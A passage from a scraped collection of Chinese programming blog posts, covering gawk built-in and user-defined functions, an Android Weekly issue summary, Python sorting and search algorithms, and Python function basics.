\nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%s %s\\n\", $1,$2}' data3  #正常输出\nkobe bryant 24 Los Lakers\nPaul Gaoso 15 los Lakers\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%16s %s\\n\", $1,$2}' data3  #指定输出字段最小宽度\n     kobe bryant 24 Los Lakers\n      Paul Gaoso 15 los Lakers\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%-16s %s\\n\", $1,$2}' data3  #指定左对齐\nkobe bryant      24 Los Lakers\nPaul Gaoso       15 los Lakers\n\n还可以指定浮点数格式\n… {printf “%5.1f\\n”, avg} …\n占5位，小数点后只显示一位。\n \n22.6 内建函数\ngawk提供了不少内建的函数，可以进行常见的数学 字符串以及时间函数运算\n \n22.6.1 数学函数\n\n\n\n\n函数\n\n\n描述\n\n\n\n\natan2(x,y)\n\n\nx/y的反正切，x y以弧度为单位\n\n\n\n\ncos(x)\n\n\nX的余弦 x以弧度为单位\n\n\n\n\nexp(x)\n\n\nX的指数函数\n\n\n\n\nint(x)\n\n\nX的整数部分，取靠近零一侧的值\n\n\n\n\nlog(x)\n\n\nX的自然对数\n\n\n\n\nrand(x)\n\n\n比0大比1小的随机浮点数\n\n\n\n\nsin(x)\n\n\n正弦，x以弧度为单位\n\n\n\n\nsqrt(x)\n\n\nX的平方根\n\n\n\n\nsrand(x)\n\n\n为计算随机数指定一个种子值\n\n\n\n\nand(v1,v2)\n\n\n执行v1和v2的按位与运算\n\n\n\n\ncompl(val)\n\n\n执行val的补运算\n\n\n\n\nlshift(val,count)\n\n\nVal的值左移count位\n\n\n\n\nor(v1,v2)\n\n\nV1和v2的按位或运算\n\n\n\n\nrshift(val,count)\n\n\nVal右移count位\n\n\n\n\nxor(v1,v2)\n\n\nV1和v2的异或运算\n\n\n\n\n \n例子：\n\n$ gawk 'BEGIN{x=rand(); print \"x =\",x}'\n$gawk 'BEGIN{x=int(-7.6); print \"x =\",x}'\n$ gawk 'BEGIN{x=sin(1.57); print \"x =\",x}'\n$ gawk 'BEGIN{x=int(10*rand()); print \"x =\",x}'\n$ gawk 'BEGIN{x=and(1,2); print \"x =\",x}'\n$ gawk 'BEGIN{x=lshift(1,2); print \"x =\",x}'\n$ gawk 'BEGIN{x=xor(1,2); print \"x =\",x}'\n\n \n22.6.2 字符串函数\n \n\n\n\n\n函数\n\n\n描述\n\n\n\n\nasort(s [,d])\n\n\n将数组s按数据元素值排序。索引值会被替换成表示新的排序顺序的连续数字。另外如果指定了d，则排序后的数组会存储在数组d中。\n\n\n\n\nasorti(s [,d])\n\n\n将数组s按索引值排序。生成的数组会将索引值作为数据元素值，用连续数字所以来表明排序顺序。若指定了d，排序后是数组会存在d中\n\n\n\n\ngensub(r,s,h [,t])\n\n\n查找变量$0或目标字符串t（若提供的话）来匹配正则表达式r。\n如果h是一个以g或G开头的字符串，就用s替换掉匹配的文本。\n如果h是数字，它表示要替换掉的第h处r匹配的地方\n\n\n\n\ngsub(r,s [,t])\n\n\n查找变量$0或目标字符串t(若提供的话)来匹配正则表达式。\n如果找到了就全部替换成字符串s\n\n\n\n\nindex(s,t)\n\n\n返回字符串t在字符串s中的索引值。如果没找到返回0\n\n\n\n\nlength([s])\n\n\n返回字符串s的长度，如果没有指定的话返回$0的长度\n\n\n\n\nmatch(s, r [,a])\n\n\n返回字符串s中正则表达式r出现位置的索引。若指定数组a，则会存储s中匹配正则表达式的那部分\n\n\n\n\nsplit(s, a [,r])\n\n\n将s用FS字符或正则表达式r（若指定的话）分开放到数组a中。返回字段总数\n\n\n\n\nsprintf(format,variables)\n\n\n用提供的format和variables返回一个类似于printf输出的字符串\n\n\n\n\nsub(r,s [,t])\n\n\n在变量$0或目标字符串t中查找正则表达式t的匹配。若找到了，就用字符串s替换掉第一处匹配\n\n\n\n\nsubstr[s,i [,n]]\n\n\n返回s从索引值i开始的n个字符组成的字符串。若未提供n，则返回s剩下的部分\n\n\n\n\ntolower(s)\n\n\n全部转小写\n\n\n\n\ntoupper(s)\n\n\n全部转大写\n\n\n\n\n \n \n有些用起来比较简单，比如大小写，求长度\n\n$ gawk 'BEGIN{x=length(\"chong\"); print \"x =\",x}'\n$ gawk 'BEGIN{x=toupper(\"chong\"); print \"x =\",x}'\n\n \n下面是asort的例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script9\nBEGIN{\nvar[\"a\"]=177\nvar[\"b\"]=9\nvar[\"c\"]=3\nvar[\"d\"]=4444\nvar[\"e\"]=566\nasort(var,test)\nfor (i in test)\n{\n         print \"Index:\",i,\"-value:\",test[i]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script9\nIndex: 4 -value: 566\nIndex: 5 -value: 4444\nIndex: 1 -value: 3\nIndex: 2 -value: 9\nIndex: 3 -value: 177\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n注意看对var数组的数据元素进行排序了。排序后的数组放在test数组里面了。\n索引值被替换成了数字。索引最大的对应数据元素也是最大的。\n \n下面是split的例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1 \ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script10\nBEGIN{\nFS=\",\"\n}\n{\ncount=split($0,test)\nfor (i in test)\n{\n         print \"Index:\", i, \"-Value:\",test[i]\n}\nprint \"count =\",count\n#print test[1], test[5]\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script10 data1\n\n \n将每一行用FS字符（,）分开，放到了test数组上。再打印数组的数据。\ncount表示字段总数\n22.6.3 时间函数\n\n\n\n\n函数\n\n\n描述\n\n\n\n\nmktime(datadpace)\n\n\n将一个按YYYYMMDDHHMMSS[DST]格式指定的日期转成时间戳值\n\n\n\n\nstrftime(format [,timestamp])\n\n\n将当前时间的时间戳或timestamp（若提供的话）转化格式化日期（采用shell函数data()的格式）\n\n\n\n\nsystime()\n\n\n返回当前时间的时间戳\n\n\n\n\n \n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script11\nBEGIN{\ndate=systime()\nday=strftime(\"%A, %B %d, %Y\",date)\nprint day\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script11\n星期六, 十一月 25, 2017\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n 注意：BEGIN后面的{要挨着BEGIN写，不能换行写。\n否则报错\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script11\ngawk: script11:2: BEGIN 块必须有一个行为部分\n22.7 自定义函数\n22.7.1 定义函数\n必须要用function关键字，格式如下：\nfunction name([variables])\n{\n  statement\n}\n函数名必须能够统一标识函数。可以在调用的gawk程序中传给这个函数一个或多个变量\n \n例子：\n// 打印记录中的第三个字段\nfunction printthird()\n{\n  print $3\n}\n \n还可以用return返回值。\n例子：\nfunction myrand(limit)\n{\n  return int(limit * rand())\n}\n用法：\nx=myrand(100)\n \n22.7.2 使用自定义函数\n定义函数时，它必须出现在所有代码块之前（包括BEGIN代码块）。\n实例：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat fun1\nfunction myprint()\n{\n         print \"This is myprint() +++\"\n         printf \"%-16s - %s\\n\", $1,$4\n}\nBEGIN{\nFS=\"\\n\"\nRS=\"\"\n}\n{\nmyprint()\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f fun1 data3\nThis is myprint() +++\nkobe bryant      - 99038\nThis is myprint() +++\nPaul Gaoso       - 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n先格式化记录中的第一个和第四个数据字段。再输出\n定义了函数就可以在程序的代码中随便使用了\n \n22.7.3 创建函数库\n可以将多个函数放到一个库文件中，这样就能在所有的gawk程序中使用了。\n步骤：\n1）先创建一个存储所有gawk函数的文件\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat funlib \nfunction mylib()\n{\n         print \"mylib() +++\"\n}\nfunction myprint()\n{\n         printf \"%-16s - %s\\n\",$1,$4\n}\nfunction myrand(limit)\n{\n         return int(limit * rand())\n}\nfunction printthird()\n{\n         print $3\n}\n\n2）就可以在脚本中使用啦\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat usefunlib \nBEGIN{\nFS=\"\\n\"\nRS=\"\"\n}\n{\nmyprint()\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f funlib -f usefunlib data3\nkobe bryant      - 99038\nPaul Gaoso       - 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n要引用文件需要使用-f参数。可以在同一命令行中使用多个-f参数。\n \n22.8 实例\n假设有一个数据文件，里面有两支队伍每队2个人，每人3次的比赛成绩。要求总成绩和平均成绩：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat scores.txt \nRich Blum,team1,100,115,99\nBar Blum,team1,110,118,114\nChr Bre,team2,120,80,90\nTim Bre,team2,125,70,60\n\n \n下面是脚本：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat bowling.sh\n#!/bin/bash\nfor team in $(gawk -F, '{print $2}' scores.txt | uniq)\ndo\n#       echo \"team: $team\"\n         gawk -v team=$team 'BEGIN{FS=\",\";total=0}\n         {\n#                print \"step1+++\"\n                   if ($2==team)\n                   {\n                            total += $3 + $4 + $5;\n                   }\n         }\n         END{\n                   avg = total / 6;\n                   print \"Total for\",team,\"is\",total,\"The avgarge is\",avg\n         }' scores.txt\ndone\n\n脚本分析：\n1）注意uniq这个关键字，这里可以排除一样的。for语句是用来筛选队名的。\n2）for循环里面，假如队名是team1，那么就先处理team1。会读取所有记录，将队名都为team1的记录的$3 $4 $5相加，就是总成绩了。最后求平均值\n \n这里是运行情况：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ ./bowling.sh \nTotal for team1 is 656 The avgarge is 109.333\nTotal for team2 is 545 The avgarge is 90.8333\n"},{"title":"Android Weekly Notes Issue #286","body":"December 3rd, 2017\nAndroid Weekly Issue #286\n本期文章包含如何通过踩坑来学习Kotlin,以及利用Kotlin的data class做MVVM状态保存,还包含一些基础知识的介绍,如RxJava2线程切换,Kotlin与Java容器分析.\n另外,还包括Intant App的软文一篇,以及 Android O对Notification进行Channel管理的文章,帮助大家适配O以上的通知.\n\nARTICLES & TUTORIALS\nSome useful insights on Instant apps\n文章介绍了荷兰的新闻应用NOS支持IA的实例,技术成分不多,更像是新闻报道,需要了解IA具体实现的可能得不到想要的.\nUsing Espresso to Test Opening Links\n一个女博主的小发现,如何通过Espresso测试通过TextView的autolink打开其他程序.\n其实是通过openLinkWithText来发出这个事件.\nLearning Kotlin by Mistake\n文章介绍了在错误中不断前行,学习Kotlin相别于Java的特性.\n如尽量的通过applay run let with等操作符将你的逻辑连起来.\nCompanionObjects与@JvmStatic @JvmField的取舍\nlateinit与by lazy的故事,以及自定义Delegate等等.\n最笨的办法也可以通过自动转换来学习,但是自动转换出来的并不是完全纯粹的Kotlin哦.\nPaper Signals: A Voice Experiment\n一个IoT的教学,制作一个声音盒子,通过你的语音可以变形. 比较有趣的是盒子的模型零件可以打印出来自己剪裁.\n需要的Code他们已经提供了.\n当然最重要的是,需要买材料,$24.95.\nKotlin Collections Inside. Part 1\n一个分析Kotlin容器的系列文章,这是第一篇,关于List.\n主要讲了Java与Kotlin容器的关系,对于Kotlin来说,所有Java的容器都是Mutable的,而对于Java来说Kotlin的Immutable容器可以调用改动操作,但是会抛异常.\n并且介绍了Kotlin如何初始化Immutable与Mutable的List,通过ByteCode分析,虽然MutableList没有继承与Java的ArrayList,但是通过arrayListOf与mutableListOf生成的List可以互转,原因是MutableList在生成ByteCode后,也同样继承了ArrayList....\nMulti-Threading Like a Boss in Android With RxJava 2\n文章主要讲了RxJava2如何在线程之间随意切换的,虽然没有涉及实现原理,但是通俗的讲解了subscribeOn与observerOn的使用.一个是改变source,一个是改变downstream.\nOreo Notifications: Channels – Part 1\n文章介绍Android O对于Notification的新概念,Channel,对于没有使用新的Notification Compat API设置Channel的,将不会再Android O上弹出通知.\nChannel是为了让用户对程序的不同Notification进行分组管理,可以对不同Channel分别设置开关,以及通知方式(震动,亮灯,静音等).\n与Channel配合的还有Group,可以将某几个Channel归类于一个Group,在设置页面可以看到不同的Group下的有不同Channel.\nRepresenting View State with Kotlin Data Classes\n文章介绍了把所有状态封装在一个ViewState的data class里,并通过其copy的方法,对发生变化的状态进行改变,这样可以保持其他状态不变.\n该状态可以作为ViewModel里面的一个Observable被订阅,获取不同状态下的ViewState,对UI进行操作.\nKotlin on the Backend\nRocket Travel已经使用Kotlin做Spring Boot开发一年有余,评价很好,可以在后端开发中使用到Kolin的feature,一定很High.\nLIBRARIES & CODE\nRoboPOJOGenerator\n一个插件可以直接将JSON转成Java或者Kotlin的POJO文件...\navdo\nPython的包,可以优化Vector动画或者Drawable文件.\n"},{"title":"算法（Python）","body":"算法就是为了解决某一个问题而采取的具体有效的操作步骤\n算法的复杂度，表示代码的运行效率，用一个大写的O加括号来表示，比如O(1)，O(n)\n认为算法的复杂度是渐进的，即对于一个大小为n的输入，如果他的运算时间为n3+5n+9，那么他的渐进时间复杂度是n3\n递归\n递归就是在函数中调用本身，大多数情况下，这会给计算机增加压力，但是有时又很有用，比如下面的例子：\n汉诺塔游戏\n\n把A柱的盘子，移动到C柱上，最少需要移动几次，大盘子只能在小盘子下面\n递归实现：\n\ndef hanoi(x, a, b, c):  # 所有的盘子从 a 移到 c\n\n    if x > 0:\n        hanoi(x-1, a, c, b)  # step1：除了下面最大的，剩余的盘子 从 a 移到 b\n        print('%s->%s' % (a, c))  # step2:最大的盘子从 a 移到 c\n        hanoi(x-1, b, a, c)  # step3: 把剩余的盘子 从 b 移到 c\n\nhanoi(10, 'A', 'B', 'C')\n\n#计算次数\n\ndef h(x):\n    num = 1\n    for i in range(x-1):\n        num = 2*num +1\n\n    print(num)\nh(10)\n\n用递归打印斐波那契数列\n\ndef fei(n):\n    if n == 0:\n        return 0\n    elif n == 1:\n        return 1\n    else:\n        return fei(n-1)+fei(n-2)\n\n你会发现，即使n只有几十的时候，你的计算机内存使用量已经飙升了\n其实，如果结合生成器，你会发现不管n有多大，都不会出现卡顿，但这是生成器的特性，本篇博客不重点介绍\n\n# 结合生成器\ndef fei(n):\n    pre,cur = 0,1\n    while n >=0:\n        yield pre\n        n -= 1\n        pre,cur = cur,pre+cur\n\nfor i in fei(400000):\n    print(i)\n\n \n关于递归次数，Python中有个限制，可以通过sys模块来修改\n\nimport sys\nsys.setrecursionlimit(1000000)\n\n \n\n \n查找\n1.顺序查找\n这个没的说，就是for循环呗，时间复杂度O(n)\n\ndef linear_search(data_set, value):\n    for i in range(len(data_set)):\n        if data_set[i] == value:\n            return i\n    return\n\n \n2.二分查找\n时间复杂度O(logn)\n就是一半一半的查找，看目标值在左边一半还是右边一半，然后替换左端点或者右端点，继续判断\n非递归版本：\n\ndef binary_serach(li,val):\n    low = 0\n    high = len(li)-1\n    while low <= high:\n        mid = (low+high)//2\n        if li[mid] == val:\n            return mid\n        elif li[mid] > val:\n            high = mid-1\n        else:\n            low = mid+1\n    else:\n        return None\n\n 递归版本的二分查找\n\ndef bin_search_rec(data_set, value, low, high):\n    if low < high:\n        mid = (low + high) // 2\n        if data_set[mid] == value:\n            return mid\n        elif data_set[mid] > value:\n            return bin_search_rec(data_set, value, low, mid - 1)\n        else:\n            return bin_search_rec(data_set, value, mid + 1, high)\n    else:\n        return None\n\n \n\n \n排序\n速度慢的三个：\n1.冒泡排序\n　　原理就是，列表相邻的两个数，如果前边的比后边的小，那么交换顺序，经过一次排序后，最大的数就到了列表最前面\n　　代码：　　\n\ndef bubble_sort(li):\n\n    for j in range(len(li)-1):\n        for i in range(1, len(li)):\n            if li[i] > li[i-1]:\n                li[i], li[i-1] = li[i-1], li[i]\n\n    return li\n\n冒泡排序的最差情况，即每次都交互顺序的情况，时间复杂度是O(n2)\n存在一个最好情况就是列表本来就是排好序的，所以可以加一个优化，加一个标志位，如果没有出现交换顺序的情况，那就直接return \n\n# 优化版本的冒泡\ndef bubble_sort_opt(li):\n    for j in range(len(li)-1):\n        flag = False\n        for i in range(1, len(li)):\n            if li[i] > li[i-1]:\n                li[i], li[i-1] = li[i-1], li[i]\n                flag = True\n        if not flag:\n            return li\n    return li\n\n 2.插入排序\n　　原理：把列表分为有序区和无序区两个部分。最初有序区只有一个元素。然后每次从无序区选择一个元素，插入到有序区的位置，直到无序区变空。\n\ndef insert_sort(li):\n    for i in range(1,len(li)):\n        tmp = li[i]\n        j = i - 1\n        while j >= 0 and tmp < li[j]:　　　　# 找到一个合适的位置插进去\n            li[j+1] = li[j]\n            j -= 1\n        li[j+1] = tmp\n    return li\n\n时间复杂度是O(n2)\n \n3.选择排序\n　　原理：遍历列表一遍，拿到最小的值放到列表第一个位置，再找到剩余列表中最小的值，放到第二个位置。。。。\n\ndef select_sort(li):\n    for i in range(len(li)-1):\n        min_loc = i         # 假设当前最小的值的索引就是i\n        for j in range(i+1,len(li)):\n            if li[j] < li[min_loc]:\n                min_loc = j\n        if min_loc != i:   # min_loc 值如果发生过交换，表示最小的值的下标不是i,而是min_loc\n            li[i],li[min_loc] = li[min_loc],li[i]\n\n    return li\n\n时间复杂度是O(n2)\n \n \n速度快的几种排序：\n4.快速排序（快排）\n原理：让指定的元素归位，所谓归位，就是放到他应该放的位置（左变的元素比他小，右边的元素比他大），然后对每个元素归位，就完成了排序\n可以参考这个动图来理解下面的代码\n\n代码：\n\n#  归位函数\ndef partition(data, left, right): # 左右分别指向两端的元素\n    tmp = data[left]                # 把左边第一个元素赋值给tmp,此时left指向空\n    while left < right:             # 左右两个指针不重合，就继续\n        while left < right and data[right] >= tmp:  # right指向的元素大于tmp,则不交换\n            right -= 1                      # right 向左移动一位\n        data[left] = data[right]            # 如果right指向的元素小于tmp，就放到左边现在为空的位置\n        while left < right and data[left] <= tmp:   # 如果left指向的元素小于tmp,则不交换\n            left += 1                       # left向右移动一位\n        data[right] = data[left]            # 如果left指向的元素大于tmp,就交换到右边\n    data[left] = tmp            # 最后把最开始拿出来的那个值，放到左右重合的那个位置\n    return left                 # 最后返回这个位置\n\n#  写好归位函数后，就可以递归调用这个函数，实现排序\ndef quick_sort(data, left, right):\n    if left < right:\n        mid = partition(data, left, right)  # 找到指定元素的位置\n        quick_sort(data, left, mid - 1)     # 对左边元素排序\n        quick_sort(data, mid + 1, right)    # 对右边元素排序\n    return data\n\n正常的情况，快排的复杂度是O(nlogn)\n快排存在一个最坏情况，就是每次归位，都不能把列表分成两部分，此时复杂度就是O(n2)了，如果要避免设计成这种最坏情况，可以在取第一个数的时候不要取第一个了，而是取一个列表中的随机数\n \n5.归并排序\n原理：列表分成两段有序，然后分解成每个元素后，再合并成一个有序列表，这种操作就叫做一次归并\n　　应用到排序就是，把列表分成一个元素一个元素的，一个元素当然是有序的，将有序列表一个一个合并，最终合并成一个有序的列表\n　　\n \n图示：\n\n \n代码：\n\ndef merge(li, left, mid, right):\n    # 一次归并过程，把从mid分开的两个有序列表合并成一个有序列表\n    i = left\n    j = mid + 1\n    ltmp = []\n    # 两个列表的元素依次比较，按从大到小的顺序放到一个临时的空列表中\n    while i <= mid and j <= right:\n        if li[i] < li[j]:\n            ltmp.append(li[i])\n            i += 1\n        else:\n            ltmp.append(li[j])\n            j += 1\n\n    # 如果两个列表并不是平均分的，就会存在有元素没有加入到临时列表的情况，所以再判断一下\n    while i<= mid:\n        ltmp.append(li[i])\n        i += 1\n    while j <= right:\n        ltmp.append(li[j])\n        j += 1\n    li[left:right+1] = ltmp\n    return li\n\n\ndef _merge_sort(li, left, right):\n    # 细分到一个列表中只有一个元素的情况，对每一次都调用merge函数变成有序的列表\n    if left < right:\n        mid = (left+right)//2\n        _merge_sort(li, left, mid)\n        _merge_sort(li, mid+1, right)\n        merge(li, left, mid, right)\n    return li\n\ndef merge_sort(li):\n    return(_merge_sort(li, 0, len(li)-1))\n\n照例，时间复杂度是O(nlogn)\n特殊的，归并排序还有一个O(n)的空间复杂度\n \n6.堆排序\n把这个放到最后，是因为这个是最麻烦的，把最麻烦的放到最后，是一种对工作负责的表现\n如果要说堆排序，首先得先把‘树’搞明白\n树\n树是一种数据结构；\n树是由n个节点组成的集合； -->如果n为0，那这是一颗空树，如果n>0，那么那存在1个节点作为树的根节点，其他节点可以分为m个集合，每个集合本身又是一棵树。\n一些可能会用到的概念：\n　　根节点：树的第一个节点，没有父节点的节点\n　　叶子节点：不带分叉的节点\n　　树的深度（高度）：就是分了多少层\n　　孩子节点、父节点：节点与节点之间的关系\n图示：\n \n二叉树\n然后在树的基础上，有一个二叉树，二叉树就是每个节点最多有两个子节点的树结构，比如这个：\n\n \n满二叉树：除了叶子节点，所有节点都有两个孩子，并且所有叶子节点深度都一样\n完全二叉树：是有满二叉树引申而来，假设二叉树深度为k，那么除了第k层，之前的每一层的节点数都达到最大，即没有空的位置，而且第k层的子节点也都集中在左子树上（顺序）\n\n \n二叉树的存储方式\n有链式存储和顺序存储的方式（列表），本篇只讨论顺序存储的方式\n思考：\n　　父节点和左孩子节点的编号下标有什么关系？　　　　0-1 1-3 2-5 3-7 4-9         i  ---->   2i+1\n　　父节点和右孩子节点的编号下标有什么关系？　　　　0-2 1-4 2-6 3-8 4-10　　i  ----->  2i+2\n \n再来了解下堆，堆说起来又麻烦了，我将在另一篇博客中单独写堆，栈等这些数据结构，本篇先讨论与排序有关的东西\n堆\n堆是一类特殊的树，要求父节点大于或小于所有的子节点\n\n大根堆：一棵完全二叉树，满足任一节点都比其孩子节点大  　　，升序用大根堆\n小根堆：一棵完全二叉树，满足任一节点都比其孩子节点小\n\n \n \n堆的调整：当根节点的左右子树都是堆时，可以通过一次向下的调整来将其变换成一个堆。\n所谓一次向下调整，就是说把堆顶的值，向下找一个合适的位置，是一次一次的找，跟他交换位置的值，也要找到一个合适的位置\n　　　　“浏览器写的没保存，丢失了，所以这块不想再写了。。。”\n \n堆排序的过程\n　　1.构造堆\n　　2.得到堆顶元素，就是最大的元素\n　　3.去掉堆顶，将堆的最后一个元素放到堆顶，此时可以通过一次调整重新使堆有序\n　　4.堆顶元素为第二大元素\n　　5.重复步骤3，直到堆为空\n \n其中构造堆的过程：\n \n \n挨个出数的过程：\n\n代码：\n \n\ndef sift(li, left, right):  # left和right 表示了元素的范围，是根节点到右节点的范围，然后比较根和两个孩子的大小，把大的放到堆顶\n                                    # 和两个孩子的大小没关系，因为我们只需要拿堆顶的元素就行了\n    # 构造堆\n    i = left        # 当作根节点\n    j = 2 * i + 1   # 上面提到过的父节点与左子树根节点的编号下标的关系\n    tmp = li[left]\n    while j <= right:\n        if j+1 <= right and li[j] < li[j+1]:    # 找到两个孩子中比较大的那个\n            j = j + 1\n        if tmp < li[j]:     # 如果孩子中比较大的那个比根节点大，就交换\n            li[i] = li[j]\n            i = j           # 把交换了的那个节点当作根节点，循环上面的操作\n            j = 2 * i + 1\n        else:            \n            break\n    li[i] = tmp             # 如果上面发生交换，现在的i就是最后一层符合条件（不用换）的根节点，\n\ndef heap_sort(li):\n    n = len(li)\n    for i in range(n//2-1, -1, -1):  # 建立堆        n//2-1 是为了拿到最后一个子树的根节点的编号，然后往前走，最后走到根节点0//2 -1 = -1\n        sift(li, i, n-1)                # 固定的把最后一个值的位置当作right，因为right只是为了判断递归不要超出当前树，所以最后一个值可以满足\n                                                    # 如果每遍历一个树，就找到它的右孩子，太麻烦了\n    for i in range(n-1, -1, -1):    # 挨个出数\n        li[0], li[i] = li[i],li[0]      # 把堆顶与最后一个数交换，为了节省空间，否则还可以新建一个列表，把堆顶（最大数）放到新列表中\n        sift(li, 0, i-1)            # 此时的列表，应该排除最后一个已经排好序的，放置最大值的位置，所以i-1\n\n时间复杂度也是O(nlogn)\n来扩展一下，如果要取一个列表的top10，就是取列表的前十大的数，怎么做？\n可以用堆来实现，取堆的前十个数，构造成一个小根堆，然后依次遍历列表后面的数，如果比堆顶小，则忽略，如果比堆顶大，则将堆顶替换成改元素，然后进行一次向下调整，最终这个小根堆就是top10\n其实Python自带一个heapq模块，就是帮我们对堆进行操作的\nheapq模块\n队列中的每个元素都有优先级，优先级最高的元素优先得到服务（操作），这就是优先队列，而优先队列通常用堆来实现\n如果用heapq模块来实现堆排序，就简单多了：\n\nimport heapq\ndef heapq_sort(li):\n    h = []\n    for value in li:\n        heapq.heappush(h,value)\n    return [heapq.heappop(h) for i in range(len(h))]\n\n而想取top10 ，直接一个方法就行了\n\nheapq.nlargest(10,li)\n\n \n这三种速度快的排序方式就说完了，其中，快排是速度最快的，即使这样，也不如Python自带的sort快\n再来介绍两种排序，希尔排序和计数排序\n7.希尔排序\n希尔排序是一种分组插入排序的算法　　\n思路：\n　　首先取一个整数d1=n/2，将元素分为d1个组，每组相邻量元素之间距离为d1，在各组内进行直接插入排序；\n　　取第二个整数d2=d1/2，重复上述分组排序过程，直到di=1，即所有元素在同一组内进行直接插入排序。\n希尔排序每趟并不使某些元素有序，而是使整体数据越来越接近有序；最后一趟排序使得所有数据有序。\n \n图示：\n　 \n代码：\n\ndef shell_sort(li):    gap = int(len(li)//2)   # 初始把列表分成 gap个组，但是每组最多就两个元素，第一组可能有三个元素    while gap >0:        for i in range(gap,len(li)):            tmp = li[i]            j = i - gap            while j>0 and tmp<li[j]:    # 对每一组的每一个数，都和他前面的那个数比较，小的在前面                li[j+gap] = li[j]                j -= gap            li[j+gap] = tmp        gap = int(gap//2)　　　　# Python3中地板除也是float类型    return li\n\n通过diamante也能看出来，其实希尔排序和插入排序是非常相像的，插入排序就可以看做是固定间隔为1的希尔排序，希尔排序就是把插入排序分了个组，同一个组内，相邻两个数之间不是相差1，而是相差gap\n时间复杂度：O((1+t)n)，其中t是个大于0小于1的数，取决于gap的取法，当gap=len(li)//2的时候，t大约等于0.3\n \n8.计数排序\n需求：有一个列表，列表中的数都在0到100之间（整数），列表长度大约是100万，设计算法在O(n)时间复杂度内将列表进行排序\n分析：列表长度很大，但是数据量很少，会有大量的重复数据。可以考虑对这100个数进行排序\n代码：\n\ndef count_sort(li):\n    count = [0 for i in range(101)]  # 根据原题，0-100的整数\n    for i in li:\n        count[i] += 1\n\n    i = 0\n    for num,m in enumerate(count):  # enumerate函数将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。\n        for j in range(m):\n            li[i] = num\n            i += 1\n\n "},{"title":"Python测试开发之函数","body":"对于初学者而言，感觉函数还是不是很好理解，尤其是当写一个脚本，或者是写一个算法，认为可能for循环就已经可以解决的问题为什么还要用函数来实现呢？\n今天就来说一下函数的优点，其实函数的最大优点就是可重用，一个函数实现后可以被其他不同的脚本来调用，这也就是体现了代码的重用性。\n\n函数的定义：def 函数名():，在定义函数时，一定要用关键字def开头，然后紧接着是函数名，括号里是要传的的参数，当然也可不传，最后面是个冒号：\n\n　　　　def add(x,y):\n　　　　    return x+y\n　　这就是一个最简单的函数\n　　2.函数的返回值：Python中自定义的函数如果有return，则返回实际的结果，如果没有返回值，则返回None，这是Python与其他语言的区别之一\n　　3.函数的调用：在定义好一个函数后，如果要实现函数的功能，一定要对其进行引用，不然函数体是不会被执行的，调用的方法也很简单，就是函数名和需要的参数即可\n　　例如上边add函数的调用： add(2,3)即可返回5\n　　\n　　注意：此处如果传入两个字符串也是OK的，这也是Python的特殊之处，他会根据传入的值来进行相应操作，如果传入的是两个数字，则进行相加，如果是两个字符串则进行拼接，但是此处必须传入的类型一致，否则会报错，所以可以根据你的需要进行处理，如果要做特定的实现可以用isinstance来判断一下类型，来达到自己想要的效果。\n　　\n　　\n　　4.函数的传参：函数的参数分为按值传递和按地址传递。按值传递是将不可变的参数传递给函数，按地址传递是将可变的参数传递给函数。此处的可变参数与不可变参数是相对内存地址而言的，如果传入的是字符串、元祖、数字，是不可变对象，就是按值传递，为什么说是不可变的，例如如果将a=1这样一个变量传递给函数，那么就是说将1的内存地址传给函数，那么计算机给1分配过内存地址后就不会在变化，所以说在函数体内对a做的任何操作都不会影响函数体外a的值，来看一个例子就会比较好理解了：\na =1\ndef print_sth(s):    s=s+1    return s\nprint print_sth(a)print a  \n　　执行结果：\n　　\n　　下面我们来看一下原理：\n　　这就是按值传递的原理，当函数体内对a进行加1操作，实际是指向另一个内存地址了，用id()就可以查看内存地址\n　　5.看了按值传递的原理，按引用传递应该就好理解了，按引用传递就是传递一些可变参数，例如list、dict等，先来看一下他们的内存地址的变化：\n　　\n　　可以看到当你在对一个list进行操作时，它指向的内存地址实际是没有变化的，所以说当传递可变参数时，函数体内对变量的操作是会影响函数体外的变量的，看一个例子就更明白了：\n　　\n　　现在对函数的按值传递和按引用传递参数应该非常了解了吧。\n　　6.可变参数的表示：*args表示传入的是一个元祖，**args表示传入的是一个字典，在实际使用中当不确定要传入多少个参数时，就可以使用这种方法：\n　　def func(a,*args):\n　　　　for i in args:\n　　　　　　a +=i\n　　　　return a\n　　\n　　你会发现，你传递几个参数都不会出问题，这就是可变参数的好处，然后看一下**args吧：\n　　\n \n　　看完这些，你是否对函数有了很大理解，现在应该感觉函数可以实现很多你想要实现的功能吧，这可不仅仅是几个for循环就能实现的哦，赶快学学函数吧，这也是后面写好代码的基础。\n \n \n　　\n 